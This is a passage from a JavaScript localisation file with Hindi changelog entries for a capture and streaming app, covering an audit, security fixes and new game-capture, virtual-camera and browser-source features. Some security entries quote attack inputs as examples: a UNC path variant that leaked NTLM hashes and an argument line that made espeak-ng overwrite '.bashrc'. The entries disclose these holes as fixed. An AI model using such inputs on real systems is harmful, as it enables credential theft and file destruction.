(function (all) { var mine = all["hi"] = all["hi"] || {}; var add = {"changelog.55f272992501":"Freally Capture में होने वाले सभी उल्लेखनीय बदलाव इस फ़ाइल में दर्ज किए जाएँगे।","changelog.34cd2e6013c5":"इसका प्रारूप <a href=\"https://keepachangelog.com/en/1.1.0/\">Keep a Changelog</a> पर आधारित है, और यह प्रोजेक्ट <a href=\"https://semver.org/spec/v2.0.0.html\">सिमैंटिक वर्ज़निंग</a> का पालन करने का लक्ष्य रखता है।","changelog.b6512e169100":"<strong>स्थिति: स्थिर।</strong> <strong>1.0.0</strong> ने गिना हुआ 100-फ़ीचर वाला रोडमैप पूरा किया (सभी 26 CAP-M अनिवार्य फ़ीचर + सभी 74 CAP-N वैकल्पिक फ़ीचर), साथ में लॉन्च से पहले निखार वाले पाँच फ़ीचर भी। <strong>1.1.0</strong> ने वह ऑटो-एक्सपोर्ट फ़ीचर जोड़ा जो Build 12 से बाक़ी था, और <strong>1.2.0</strong> आख़िरी तीन जोड़ता है: वर्चुअल कैमरा, असली ब्राउज़र सोर्स और गेम कैप्चर। <strong>1.2.1</strong> Operation_Optimization ऑडिट है: कोई नया फ़ीचर नहीं, लेकिन पूरे कोडबेस की सुरक्षा और सही व्यवहार की जाँच — और 1.2.0 में जोड़े गए तीनों फ़ीचर अब सचमुच पहुँच में हैं और काम करते हैं। नीचे की सीढ़ी दर्ज करती है कि यह यहाँ तक कैसे पहुँचा, 0.70.0 के स्टूडियो MVP से ऊपर तक।","changelog.bd0bded7ecb3":"[1.2.1] — 2026-08-20 (Operation_Optimization — ऑडिट, सुदृढ़ीकरण और पहुँच)","changelog.52c9ccef246a":"<strong>पूरे कोडबेस का ऑडिट, और उससे निकले सुधार।</strong> ऐप का हर खंड — 13 खंडों में फैली लगभग ~147k पंक्तियाँ — <code>/simplify</code>, <code>/security-review</code> और <code>/code-review</code> से होकर गुज़रा। कुछ भी नया नहीं जोड़ा गया। बदलाव यह है कि 1.2.0 में <em>शिप</em> हुई कई चीज़ें अब सचमुच <strong>काम करती हैं</strong>: गेम कैप्चर किसी भी आधुनिक गेम तक नहीं पहुँचता था, वर्चुअल कैमरा शुरू ही नहीं हो सकता था, और ब्राउज़र सोर्स मेन्यू से छिपा हुआ था। इनके साथ ही, एक पाथ गार्ड — जिस पर ऐप का हर दूसरा गार्ड निर्भर है — सिर्फ़ एक अक्षर से बायपास किया जा सकता था।","changelog.b16452720739":"ठीक किया गया — सुरक्षा","changelog.d62edfd54f4e":"<strong>नेटवर्क-पाथ गार्ड Windows द्वारा स्वीकार की जाने वाली दो UNC वर्तनियाँ पकड़ नहीं पाता था।</strong> <code>is_remote</code> ने <code>\\\\</code> और <code>//</code> की जाँच की, लेकिन <code>/\\</code> या <code>\\/</code> की नहीं, जबकि Win32 उस दो-अक्षर वाले प्रीफ़िक्स में दोनों विभाजकों को एक-दूसरे की जगह मान लेता है — <code>GetFullPath(&quot;/\\localhost\\C$\\Windows&quot;)</code> सचमुच <code>\\\\localhost\\C$\\Windows</code> में रिज़ॉल्व होता है। चूँकि यही एक प्रेडिकेट ऐप की <em>हर</em> पाथ जाँच का आधार है (रिकॉर्डिंग, फ़ोल्डर दिखाना, पैक आयात, पाइपलाइन, स्वचालन और छह स्टूडियो गार्ड), सिर्फ़ एक अक्षर बदल देने से एक असली SMB कनेक्शन बन जाता था और हमलावर के चुने हुए होस्ट तक एक NTLM क्रेडेंशियल हैश लीक हो जाता था। अब दोनों विभाजकों को सामान्यीकृत किया जाता है और शुरुआती व्हाइटस्पेस हटा दिया जाता है।","changelog.57f43b5bfb70":"<strong>गेम-कैप्चर इंजेक्शन एक ऐसे pid पर भरोसा करता था जो दोबारा इस्तेमाल हो चुका हो सकता था।</strong> <code>inject()</code> सहमति को उस executable नाम से जाँचता था जो <em>कॉलर</em> ने दिया था, न कि उस प्रोसेस से जिसे उसने असल में खोला — और Windows विंडो खोजने और <code>OpenProcess</code> के बीच pid बहुत तेज़ी से दोबारा इस्तेमाल करता है। अब यह खुले हैंडल से इमेज का नाम पूछता है और <code>CreateRemoteThread</code> से पहले सहमति दोबारा जाँचता है।","changelog.14fb39bd677f":"<strong>WHIP <code>http://</code> स्वीकार कर लेता था।</strong> WHIP में स्ट्रीम कुंजी ही bearer टोकन <em>है</em>, इसलिए प्लेनटेक्स्ट एंडपॉइंट हर बार फिर से जुड़ने पर क्रेडेंशियल को बिना एन्क्रिप्शन के नेटवर्क पर भेज देता था। अब सिर्फ़ <code>https</code>।","changelog.e53e8143a9a0":"<strong><code>espeak-ng</code> में उपयोगकर्ता के टेक्स्ट से पहले <code>--</code> नहीं था</strong> (<code>spd-say</code> वाली शाखा में यह पहले से था), इसलिए <code>-w/home/user/.bashrc</code> जैसी टेलीप्रॉम्प्टर पंक्ति उससे उस फ़ाइल के ऊपर एक WAV लिखवा देती थी।","changelog.27867a99df1e":"<strong>NDI का &quot;सिर्फ़ पूर्ण पाथ&quot; वाला नियम एक <code>debug_assert!</code> था</strong> — जो शिपिंग बिल्ड से कंपाइल होकर हट जाता था, जिससे उपयोगकर्ता द्वारा बदला जा सकने वाला एक एनवायरनमेंट वेरिएबल <code>LoadLibraryW</code> को किसी सापेक्ष पाथ की ओर मोड़ सकता था।","changelog.e7e404533641":"<strong>रिमोट-मेहमान का आमंत्रण टोकन क्वेरी स्ट्रिंग से हटकर</strong> URL फ़्रैगमेंट में चला गया है, ताकि वह अब Pages के एक्सेस लॉग, ब्राउज़र इतिहास या किसी cross-origin <code>Referer</code> तक न पहुँचे।","changelog.db73bbe95da1":"<strong>SRT इनजेस्ट पासफ़्रेज़ अब छिपाकर दिखाया जाता है</strong>, ऐप के हर दूसरे गोपनीय फ़ील्ड की तरह।","changelog.e6d73277285d":"ठीक किया गया — क्रैश और सही व्यवहार","changelog.66b4f9443b67":"<strong>कंपोज़िटर रेंडर थ्रेड पर panic कर सकता था।</strong> वह फ़्रेम के बीच में ही पूरा यूज़र-शेडर पाइपलाइन कैश साफ़ कर देता था, जबकि <code>compose_scene</code> के पास अब भी उसकी ओर इशारा करने वाले प्लान होते थे, और फिर <code>.expect()</code> करता था — यह दो शेडर फ़िल्टर और सामान्य लाइव संपादन से ही हो सकता था, क्योंकि शेडर एडिटर में हर कीस्ट्रोक एक नया हैश बनाता है। अब लुकअप विफल होने को संभालते हैं, और कैश से सिर्फ़ विफल कंपाइल हटाए जाते हैं।","changelog.b9e2ec0e1165":"<strong>wgpu के लिए कोई uncaptured-error हैंडलर इंस्टॉल नहीं था</strong>, इसलिए कंपोज़िटर में कहीं भी होने वाली कोई भी वैलिडेशन या आउट-ऑफ़-मेमोरी त्रुटि पूरे प्रोसेस का panic बन जाती थी। अब वह लॉग की जाती है और वह फ़्रेम छोड़ दिया जाता है।","changelog.b8bd5c6887ba":"<strong>Move ट्रांज़िशन के दौरान छिपे हुए समूह ऑन एयर दिख जाते थे</strong> — हर दूसरा कंपोज़ पाथ <code>group_hides</code> का पालन करता है, लेकिन मॉर्फ़ पाथ नहीं करता था, इसलिए ट्रांज़िशन की पूरी अवधि में छिपे आइटम रिकॉर्ड और स्ट्रीम होते रहते थे।","changelog.a87472f8edb5":"<strong>स्ट्रीमिंग और रीप्ले अब गलत आकार का फ़्रेम अस्वीकार करते हैं।</strong> सत्र के बीच कैनवस बदल सकता है और एनकोडरों को निश्चित आकार के raw फ़्रेम दिए जाते हैं, इसलिए एक गलत आकार के बफ़र से बाक़ी पूरे प्रसारण की बाइट स्ट्रीम बेमेल हो जाती थी, जबकि स्थिति तब भी &quot;लाइव&quot; दिखाती रहती थी।","changelog.42b801d420c3":"<strong>ऑडियो underrun से उबरने का कोई तरीका नहीं था।</strong> 30 ms का प्रीबफ़र ख़ाली होते ही बाद का हर ब्लॉक सन्नाटे से जोड़ा गया अधूरा ब्लॉक होता था — एक अकेली गड़बड़ी के बजाय लगातार चटचटाहट।","changelog.b31061525f09":"डुप्लिकेट आइटम id अब फ़िल्टर-चेन कैश की सीमा से बाहर इंडेक्स नहीं करते; NaN फ़ेड अवधि सोर्स को हमेशा के लिए छिपाने के बजाय उस फ़िल्टर को छोड़ देती है; बहुत बड़ी मास्क इमेज wgpu को panic कराने के बजाय अस्वीकार कर दी जाती हैं; और <code>fader_gain</code> को वह <code>is_finite</code> गार्ड मिल गया है जो उसके साथी फ़ंक्शन में पहले से था (वहाँ आया NaN चिपका रहता है और मास्टर मिक्स, LUFS और रिकॉर्डिंग को स्थायी रूप से दूषित कर देता है)।","changelog.c77e993871b2":"ठीक किया गया — CAP-N78 गेम कैप्चर अब आधुनिक गेम पर काम करता है","changelog.9f9efaee9c7f":"<strong>सिर्फ़ <code>IDXGISwapChain::Present</code> हुक किया गया था।</strong> DXGI 1.2+ के <strong>flip-model</strong> गेम — एक्सक्लूसिव फ़ुलस्क्रीन में चलने वाले ज़्यादातर गेम — <code>Present1</code> से प्रेज़ेंट करते हैं और उस स्लॉट को कभी नहीं छूते, इसलिए इंजेक्शन सफलता बताता था पर एक भी फ़्रेम कभी नहीं आता था। अब दोनों स्लॉट हुक किए जाते हैं, और इसे एक एंड-टू-एंड परीक्षण कवर करता है जो एक असली flip-model स्वैप चेन बनाता है, सिर्फ़ <code>Present1</code> से प्रेज़ेंट करता है और कैप्चर हुआ फ़्रेम वापस पढ़ता है।","changelog.77d8a35def9c":"<strong>डिवाइस-लॉस्ट की स्थिति संभाली जाती है।</strong> साझा टेक्सचर उस डिवाइस को दर्ज करता है जिसने उसे बनाया, इसलिए TDR होने पर या एक्सक्लूसिव फ़ुलस्क्रीन से alt-tab करने पर दो डिवाइसों के बीच कॉपी करने के बजाय उसे फिर से बनाया जाता है।","changelog.b122bc48cff9":"<strong>कई स्वैप चेन अब हर प्रेज़ेंट पर साझा टेक्सचर को बार-बार दोबारा नहीं बनवातीं</strong> (लॉन्चर विंडो, एडिटर व्यूपोर्ट या स्प्लैश स्क्रीन पहले पूरे रिज़ॉल्यूशन पर सेकंड में 60+ बार दोबारा बनाने पर मजबूर करते थे); अब पहली चेन पर टिका रहा जाता है।","changelog.fda7f3673f30":"<strong>मल्टीसैंपल्ड बैक बफ़र रिज़ॉल्व किए जाते हैं</strong>, बजाय इसके कि <code>CopyResource</code> चुपचाप विफल हो जाए।","changelog.b3bac7144e62":"<strong>अनलोड पर vtable सचमुच बहाल किया जाता है</strong> — स्पष्ट रूप से <code>DLL_PROCESS_DETACH</code> से, और सिर्फ़ तभी जब स्लॉट में अब भी हमारे फ़ंक्शन हों, ताकि बाद में हुक करने वाला कोई ओवरले कभी चुपचाप अनहुक न हो। (पहले का यह दावा कि <code>HookState</code> का <code>Drop</code> यह काम करता था, गलत था: Rust static को कभी drop नहीं करता।)","changelog.27986d7f86bc":"<strong>D3D12 गेम अब पहले फ़्रेम का टाइमआउट गँवाने के बजाय जल्दी और ईमानदारी से विफल होता है</strong>, और इंजेक्ट किया गया DLL अब stderr पर नहीं लिखता — GUI-सबसिस्टम वाले गेम के पास कोई stderr हैंडल नहीं होता, और <code>panic = &quot;abort&quot;</code> के साथ एक विफल लेखन <em>गेम</em> को ही बंद कर देता था।","changelog.dd55e1058c26":"गेम के रेंडर थ्रेड को अब हर प्रेज़ेंट पर 4 ms का keyed-mutex इंतज़ार नहीं झेलना पड़ता।","changelog.3f346cd6bbf4":"ठीक किया गया — आख़िरकार पहुँच में","changelog.ef07cd87f669":"<strong>ब्राउज़र सोर्स अब जोड़ें मेन्यू में है।</strong> यह 1.2.0 में पूरा शिप हुआ था, लेकिन एक बंद फ़्लैग के पीछे, और मेन्यू अब भी ऑपरेटरों से इसकी जगह विंडो कैप्चर इस्तेमाल करने को कहता था।","changelog.3ff4af9be26b":"<strong>वर्चुअल कैमरा शुरू किया जा सकता है।</strong> बैकएंड पूरा था, पर उसे कोई बुलाता ही नहीं था: न start/stop कमांड थे और बटन कोड में ही निष्क्रिय किया हुआ था। अब यह शुरू से अंत तक जुड़ा है और <em>मौजूदा</em> प्रोग्राम रीडबैक से ही शाखा लेता है, इसलिए इसे चालू करने की लागत उस हर फ़्रेम पर बस एक अतिरिक्त publish है जो पहले से पढ़ा जा रहा था। यह अब भी कोड-साइन नहीं है, और असली Zoom/Meet/Teams परीक्षण अब भी बाक़ी है।","changelog.01041cd1674e":"बदला गया — प्रदर्शन","changelog.ae778ae72eb2":"चार डिकोड पाथ हर फ़्रेम पर पूरा फ़्रेम कॉपी करते थे; कंपोज़िटर हर फ़िल्टर-चेन टेक्सचर को सेकंड में 60 बार नष्ट करके फिर बनाता था (कैश हर कंपोज़ पर छाँटा जाता था, लेकिन कंपोज़ प्रोग्राम, प्रीव्यू, वर्टिकल, नेस्टेड सीन, थंबनेल, प्रोजेक्टर और ट्रांज़िशन के दोनों हिस्सों के लिए चलता है); <code>.frec</code> रिकॉर्डिंग हर फ़्रेम पर एक syscall करती थी और घटाने से पहले 8 MB कॉपी करती थी; FLZ हर स्लाइस के लिए 64 KiB की तालिका आवंटित करता था और डिकोडर एक ऐसा बफ़र आवंटित करता था जिसे वह तुरंत कॉपी करके छोड़ देता था; <code>sanitize</code> हर लोड और आयात पर द्विघाती समय लेता था; कैप्चर मेलबॉक्स 8 MB के फ़्रेम को उसी लॉक के भीतर मुक्त करता था जिसका उसका उपभोक्ता इंतज़ार करता है।","changelog.8800583b308d":"<strong>ऑडियो denormal मानों को फ़्लश किया जाता है।</strong> <code>forbid(unsafe_code)</code> के साथ MXCSR का flush-to-zero बिट उपलब्ध नहीं है, इसलिए म्यूट स्ट्रिप घटते-घटते denormal दायरे में पहुँचकर वहीं रह जाती थीं, जिससे हर सैंपल पर 10–100× ज़्यादा लागत आती थी।","changelog.70947783a47e":"जोड़ा गया — मज़बूती और टूलिंग","changelog.cc7a8bef1645":"<strong>एक React error boundary</strong>, जो दोनों साझा शेल (<code>PickerShell</code>, जिसे 59 फ़ाइलें इम्पोर्ट करती हैं, और <code>Panel</code>) में जोड़ी गई है। पहले रेंडर के दौरान फेंकी गई एक त्रुटि पूरे स्टूडियो को अनमाउंट कर देती थी, जबकि Rust वाला हिस्सा एनकोड और स्ट्रीम करता रहता था — ऑफ़-एयर नहीं, लेकिन बिना कुछ देखे और बिना रोक पाने के। अब क्रैश हुआ डायलॉग भी अपना बंद करने वाला बटन बनाए रखता है।","changelog.c7dc2964a7e9":"<strong>दो विज़ुअल-स्मोक परीक्षण ख़ाली स्क्रीन पर पास हो रहे थे।</strong> <code>11-recordings</code> और <code>19-profiles</code> दोनों ठीक 4,255 बाइट के थे: मॉक ने वे कमांड कभी परिभाषित ही नहीं किए थे जिन्हें ये डायलॉग पढ़ते हैं, ऐप अनमाउंट हो जाता था, और लूप कुछ भी जाँचता नहीं था। मॉक में 16 कमांड और एक पूरा सेटिंग्स फ़िक्स्चर जोड़ा गया है, और लूप अब जाँचता है कि डायलॉग सचमुच दिख रहा है।","changelog.e020b3ffc504":"<strong>फ़ज़िंग।</strong> <code>.frec</code> डीकंप्रेसर और कैप्चर-id पार्सर के लिए नियतात्मक, जान-बूझकर ख़राब इनपुट वाली जाँचें तीनों OS पर सामान्य परीक्षण-समूह में चलती हैं, साथ में एक <code>cargo-fuzz</code> हार्नेस भी — <code>flz::decompress_into</code> पर 77,625,230 बार चलाया गया, बिना एक भी क्रैश के।","changelog.f52e2bae0c8f":"<code>docs/local-security-tooling.md</code> उन सिर्फ़-लोकल स्कैनरों को दर्ज करता है जो चलाए गए (Semgrep: 0 निष्कर्ष; Trivy: 0 सीक्रेट, 0 high/critical), और ईमानदारी से यह भी बताता है कि Miri को यहाँ जोड़ना क्यों उपयोगी <em>नहीं</em> है: सभी बारह लाइब्रेरी क्रेट पहले से <code>deny(unsafe_code)</code> करते हैं, और बचा हुआ unsafe कोड FFI है, जिसे Miri चला नहीं सकता।","changelog.30ae102eb166":"[1.2.0] — 2026-08-19 (गहरा कैप्चर और वेब)","changelog.c240db164d51":"<strong>ऐप में आख़िरी तीन जोड़।</strong> वर्चुअल कैमरा, असली ब्राउज़र सोर्स, और इंजेक्ट किए गए GPU present-hook के ज़रिए गेम कैप्चर। तीनों पहले Windows पर आए हैं, और हर OS की स्थिति को नकली ढंग से दिखाने के बजाय ईमानदारी से बताया गया है। इनमें से दो ऐसे कंपोनेंट शिप करते हैं जो <strong>अभी कोड-साइन नहीं हैं</strong>, और लाइव-परिदृश्य परीक्षण (कॉन्फ़्रेंसिंग ऐप में दिखता कैमरा; किसी सुरक्षित गेम में इंजेक्ट करना) अभी बाक़ी हैं — दोनों को ढकने के बजाय नीचे के नोट्स में साफ़ बताया गया है।","changelog.6b02e0d363a4":"जोड़ा गया","changelog.15c7060f73c9":"<strong>इंजेक्ट किए गए GPU present-hook के ज़रिए गेम कैप्चर (CAP-N78, Windows)।</strong> अब किसी गेम को उसके अपने स्वैप-चेन <code>Present</code> के ज़रिए कैप्चर किया जा सकता है — उन एक्सक्लूसिव-फ़ुलस्क्रीन गेम के लिए जिन तक WGC विंडो कैप्चर नहीं पहुँच सकता, और गेम की अपनी नेटिव present दर पर। यह <strong>सख़्ती से हर गेम के लिए अलग ऑप्ट-इन है</strong>: जब तक आप उस ख़ास गेम के लिए anti-cheat/AV का साफ़-साफ़ बताया गया जोखिम स्वीकार नहीं करते, कुछ भी इंजेक्ट नहीं होता (एक <code>Consent</code> जो एक ही executable तक सीमित है और सिर्फ़ स्पष्ट स्वीकृति से बनता है — इसे कभी किसी दूसरे गेम पर दोबारा इस्तेमाल नहीं किया जा सकता), और जो गेम हुक को ठुकरा देता है वह क्रैश होने के बजाय एक ईमानदार संदेश के साथ मौजूदा विंडो कैप्चर पर लौट आता है। सोर्स ▸ गेम कैप्चर (पहले पढ़ें) → स्वीकार करें → गेम चुनें। हुक DLL सिर्फ़ DXGI vtable को पैच करता है, हर बैक बफ़र को एक keyed-mutex साझा टेक्सचर में कॉपी करता है, और अनलोड पर vtable को बहाल करता है; व्यस्त फ़्रेम छोड़ दिया जाता है ताकि गेम कभी हमारी वजह से न अटके। HDR बैक बफ़र को 8-बिट के रूप में गलत पढ़ने के बजाय WGC पर भेजा जाता है (जिसे डेस्कटॉप कंपोज़िटर टोन-मैप करता है)। नया क्रेट <code>freally-game-hook</code>; प्रोटोकॉल <code>design/game-hook-protocol.md</code> में।","changelog.8a03cfb2c221":"<strong>वर्चुअल कैमरा (CAP-N76, Windows)।</strong> कंपोज़ किया गया प्रोग्राम एक &quot;Freally Capture Virtual Camera&quot; को एक lock-free, डबल-बफ़र्ड साझा-मेमोरी ट्रांसपोर्ट (<code>fcap_stream::vcam::transport</code>) और Media Foundation के <code>MFCreateVirtualCamera</code> जीवनचक्र (<code>fcap-vcam-win</code>) के ज़रिए दिया जाता है, जो रुकने <em>और</em> drop होने, दोनों पर डिवाइस हटा देता है ताकि कोई ज़ॉम्बी कैमरा बचा न रहे। पंजीकृत frame-server सोर्स एक असली <code>IMFMediaSource</code> COM DLL (<code>freally-vcam-source</code>) है जो हर उपयोगकर्ता के लिए ख़ुद को पंजीकृत करता है (एडमिन अधिकारों के बिना) और ऐप के फ़्रेम RGB32 स्ट्रीम के रूप में देता है — वही ज़रूरत पड़ने पर डाउनलोड होने वाला, हैश से सत्यापित कंपोनेंट मॉडल जो ffmpeg/CEF ब्रिज का है। <code>virtual_camera_status</code> UI को ईमानदारी से उपलब्धता बताता है; कैमरा वर्तमान उपयोगकर्ता के लिए बिना कोड-साइन के चलता है, और कोड-साइनिंग ही रिलीज़ से जुड़ा अकेला बाक़ी कदम है। macOS (CoreMediaIO) और Linux (v4l2loopback) के अपने अलग कंपोनेंट हैं।","changelog.7f566bdedc82":"<strong>असली ब्राउज़र सोर्स — CEF OSR बैकएंड (CAP-N77)।</strong> कोई भी http/https पेज चुने गए रिज़ॉल्यूशन/fps पर CEF के ज़रिए ऑफ़स्क्रीन रेंडर होता है और <code>FBH1</code> + निश्चित आकार के फ़्रेम के रूप में कंपोज़िटर तक स्ट्रीम होता है। बैकएंड (<code>crates/browser-host --features cef</code>) पिन किए गए, हैश-सत्यापित CEF कंपोनेंट से libcef लिंक करता है और <strong>हर</strong> नेविगेशन को साझा allowlist से होकर गुज़ारता है (<code>file://</code>/<code>javascript:</code> पर रीडायरेक्ट रद्द कर दिया जाता है, उसका कभी पालन नहीं होता)। Windows पर शुरू से अंत तक सत्यापित: एक लाइव URL असली फ़्रेम में रेंडर होता है और stdin-EOF पर साफ़ तरीके से बंद होता है। रनटाइम सिर्फ़ पहली बार इस्तेमाल पर डाउनलोड होता है (कभी बंडल नहीं); हर OS के लिए कोड-साइनिंग ही बाक़ी रिलीज़ कदम है।","changelog.8f6fb4eb7f42":"सुरक्षा","changelog.2e30d476c4fe":"<strong>ब्राउज़र सोर्स अब Windows पर Chromium का renderer sandbox चलाता है।</strong> होस्ट मनमाने वेब पेज रेंडर करता है, और कोई पेज किसी आयात किए गए सीन संग्रह से भी आ सकता है, फिर भी पहले यह Chromium को sandbox बंद करके शुरू करता था — वही एक नियंत्रण जो किसी हैक हुए पेज को आपके नाम से कोड चलाने से रोकता है। Windows अब sandbox में चलता है। macOS और Linux फ़िलहाल बिना sandbox के हैं (Linux sandbox को विशेषाधिकार वाले एक हेल्पर की ज़रूरत है जिसे कंपोनेंट अभी शिप नहीं करता), और यह बात कोड में लिखी गई है, ताकि यह जान-बूझकर किया गया न लगे।","changelog.17f0a576df73":"<strong>गेम कैप्चर की सहमति अब सीन संग्रह के साथ नहीं जाती।</strong> संग्रह एक साझा किया जा सकने वाला दस्तावेज़ है — एक <code>.fcappack</code>, OBS आयात, स्नैपशॉट या हाथ से संपादित फ़ाइल — इसलिए उसमें कभी किसी दूसरे प्रोसेस में DLL इंजेक्ट करने का अधिकार नहीं आना चाहिए। पहले ऐसा हो सकता था: &quot;मैं anti-cheat का जोखिम स्वीकार करता हूँ&quot; फ़्लैग दस्तावेज़ का ही एक फ़ील्ड था, और किसी प्राप्त पैक का गेम कैप्चर सोर्स जिस भी executable का नाम लेता, आयात करते ही उसमें इंजेक्ट हो जाता — बिना कुछ पूछे, और जोखिम का टेक्स्ट कभी दिखाए बिना। अब संग्रह लोड करने पर वह फ़्लैग हमेशा साफ़ हो जाता है (एक रिग्रेशन परीक्षण इसे कवर करता है), इसलिए आयात किया गया लेआउट तब तक सामान्य विंडो कैप्चर पर रहता है जब तक ऑपरेटर पिकर के ज़रिए फिर से ऑप्ट-इन न करे — वही एक जगह जहाँ चेतावनी सचमुच दिखाई जाती है।","changelog.5d0d9a1170f9":"<strong>सहमति अब उसी executable से बँधी है जिसे उपयोगकर्ता ने सचमुच मंज़ूरी दी।</strong> पहले यह शुरू होने के समय रिज़ॉल्व हुए executable से बनती थी और फिर उसी स्ट्रिंग से जाँची जाती थी, इसलिए जाँच कभी विफल हो ही नहीं सकती थी, और दस्तावेज़ में लिखी गारंटी &quot;<code>game-a.exe</code> के लिए दी गई सहमति कभी <code>game-b.exe</code> पर दोबारा इस्तेमाल नहीं हो सकती&quot; रनटाइम पर मौजूद ही नहीं थी। अब सहमति उस प्रोग्राम के लिए दी जाती है जो सोर्स चुनते समय दर्ज हुआ था, और उसे उस प्रोग्राम से मिलाया जाता है जिस पर विंडो अभी रिज़ॉल्व होती है, इसलिए किसी दूसरे प्रोसेस से फिर से जुड़ने वाला सोर्स इंजेक्ट होने के बजाय अस्वीकार कर दिया जाता है।","changelog.4118fb4fed0e":"हटाया गया","changelog.a76a693b9e23":"<strong>Freally Central इंटीग्रेशन (&quot;और Freally ऐप&quot;)।</strong> Freally Central अब मौजूद नहीं है, इसलिए vendored <code>vendor/freally-central</code> सबमॉड्यूल और उस पर निर्भर सब कुछ हटा दिया गया है: <code>freally-central-engine</code> क्रेट निर्भरता और उसके सात <code>central_*</code> Tauri कमांड, <strong>सहायता → और Freally ऐप</strong> मेन्यू आइटम और उसका डायलॉग, पैनल का <code>fcp-*</code> थीम ब्रिज, <code>@freally/central-panel</code> के tsconfig/vite उपनाम, और vendored <code>fcp-*</code> लोकेल कैटलॉग जो हर बंडल में जोड़े जाते थे। Capture अब किसी ऐसे रिपॉज़िटरी पर निर्भर नहीं है जो अब है ही नहीं — नया clone और CI checkout अब सफल होते हैं, जहाँ गायब सबमॉड्यूल उन्हें विफल कर देता।","changelog.1246fc93bca0":"ठीक किया गया","changelog.3e3cbc39c891":"<strong>ब्राउज़र होस्ट को अब सीधे मार देने के बजाय साफ़ तरीके से बंद किया जाता है।</strong> होस्ट को उसके stdin को <code>/dev/null</code> पर रखकर शुरू किया जाता था, जिससे प्रोटोकॉल में दर्ज &quot;stdin बंद → exit 0&quot; संकेत भेजना असंभव था — इसलिए हर बार रोकना एक ज़बरदस्ती kill होता था, जिससे CEF की अपनी render/GPU सबप्रोसेस अनाथ रह जाती थीं। अब इसका stdin एक लाइव पाइप है, और उसे बंद करने पर होस्ट को kill किए जाने से पहले ख़ुद बाहर निकलने के लिए एक सीमित मोहलत (500 ms) मिलती है। यह सीमा जान-बूझकर रखी गई है: <code>stop()</code> पंप के ख़त्म होने का इंतज़ार करता है, इसलिए यह स्टूडियो के reconcile पाथ पर है और इसे कभी भी सीन बदलने को अटकाना नहीं चाहिए।","changelog.158d17057e90":"<strong>CEF रनटाइम फ़ेचर अब उसी लाइन पर पिन है जिसके लिए होस्ट बनाया गया है।</strong> पहले यह वही ले लेता था जिसे <code>index.json</code> सबसे नया कहता था। CEF में मेजर संस्करणों के बीच ABI स्थिरता नहीं है और होस्ट ऐसा रनटाइम अस्वीकार कर देता है जिसके लिए वह नहीं बना, इसलिए &quot;latest&quot; लगभग 100 MB का डाउनलोड करवाकर ऐसे ब्राउज़र सोर्स तक पहुँचा सकता था जो आगे काम ही न करे। अब पिन किए गए मेजर संस्करण के <em>भीतर</em> सबसे नया स्थिर <code>minimal</code> बिल्ड चुना जाता है, जिससे उस लाइन के भीतर Chromium के सुरक्षा पैच फिर भी मिलते रहते हैं।","changelog.7416b5a9ae50":"<strong>सिर्फ़-http/https वाला नियम अब सिर्फ़ शुरुआती URL पर ही नहीं, रीडायरेक्ट पर भी लागू होता है।</strong> http से परोसा गया पेज रीडायरेक्ट कर सकता था — 302, <code>location.href</code>, <code>window.open</code>, कोई सबफ़्रेम — <code>file://</code> पर जाकर लोकल फ़ाइलें पढ़ सकता था, या <code>javascript:</code>/<code>data:</code> पर जाकर ऐसी स्क्रिप्ट चला सकता था जिसे ऑपरेटर ने कभी नहीं चुना। allowlist एक ही परखा हुआ गेट (<code>is_allowed_url</code>) है, जिसे अब CEF बैकएंड को अपने नेविगेशन हैंडलर से बुलाना ज़रूरी है, ताकि argv वाला नियम और रीडायरेक्ट वाला नियम कभी अलग-अलग न हो सकें।","changelog.d70c33477501":"<strong>ब्राउज़र पिकर का कंपोनेंट बैनर अब खुलते समय जम जाने के बजाय इंस्टॉल के साथ बदलता है।</strong> वह माउंट होते समय रनटाइम की स्थिति एक ही बार पढ़ता था, इसलिए पिकर खुला रहते उपकरण → कंपोनेंट से इंस्टॉल करने के बाद भी वह यही कहता रहता था कि कंपोनेंट गायब है। अब वह <code>cef</code> इवेंट को सब्सक्राइब करता है और चारों स्थितियों में फ़र्क़ करता है: इंस्टॉल नहीं है, इंस्टॉल पहले से चल रहा है, इंस्टॉल विफल हुआ (कारण के साथ), और ऐसा प्लेटफ़ॉर्म जिसके लिए CEF कोई बिल्ड प्रकाशित नहीं करता — जहाँ &quot;इसे कंपोनेंट से इंस्टॉल करें&quot; ऐसी सलाह थी जो कभी सफल नहीं हो सकती थी।","changelog.de0da2df5676":"<strong>ब्राउज़र होस्ट के CEF बैकएंड सीम को अब CI में lint किया जाता है।</strong> <code>--features cef</code> सिर्फ़ कंपोनेंट माइलस्टोन ही बनाता है, इसलिए वह धीरे-धीरे ऐसी स्थिति में पहुँच गया था जो <code>clippy -D warnings</code> में विफल होती थी और पहली ही बार चलने पर उस बिल्ड को तोड़ देती। अब CI हर push पर इस सीम को lint करता है।","changelog.63e7bdb09d63":"<strong>गेम कैप्चर अब रीसाइज़ या alt-tab के बाद भी चलता रहता है।</strong> प्रोड्यूसर का नामित साझा-टेक्सचर हैंडल बनाया जाता था और फिर यूँ ही छोड़ दिया जाता था, इसलिए वह नाम गेम प्रोसेस के पूरे जीवनकाल तक पंजीकृत रहता था। इसके बाद हर ज्यामिति बदलाव टेक्सचर को एक ऐसे नाम से दोबारा बनाने की कोशिश करता था जो अब भी मौजूद था, <code>DXGI_ERROR_NAME_ALREADY_EXISTS</code> के साथ विफल होता था, और कैप्चर बिना कोई संदेश दिखाए हमेशा के लिए बंद हो जाता था। अब हैंडल ऐप के स्वामित्व में रहता है और बंद किया जाता है, और नया टेक्सचर बनाने से पहले पुराना टेक्सचर छोड़ दिया जाता है।","changelog.0a3b42e6c8d3":"<strong>पहली बार गेम कैप्चर जोड़ने पर अब चुपचाप विंडो कैप्चर पर नहीं लौटा जाता।</strong> इंजेक्शन उसी क्षण लौट आता है जब रिमोट <code>LoadLibraryW</code> लौटता है, लेकिन <code>DllMain</code> सिर्फ़ arming थ्रेड को <em>शुरू</em> करता है — कंट्रोल ब्लॉक तब तक मौजूद ही नहीं होता जब तक वह थ्रेड एक डिवाइस और एक डमी स्वैप चेन न बना ले। ऐप तुरंत जुड़ जाता था और यह होड़ हमेशा हार जाता था। अब यह हुक के सचमुच सक्रिय होने का (सीमित समय तक) इंतज़ार करता है।","changelog.b97f30288a77":"<strong>हुक किया गया गेम बंद होने पर सोर्स को छोड़ देता है।</strong> <code>FLAG_PRODUCER_ALIVE</code> कभी साफ़ नहीं होता — जिस गेम को मार दिया जाए या जो क्रैश हो जाए, वह कभी <code>DLL_PROCESS_DETACH</code> नहीं चलाता — इसलिए आख़िरी कंट्रोल ब्लॉक फ़्लैग सेट रहते हुए 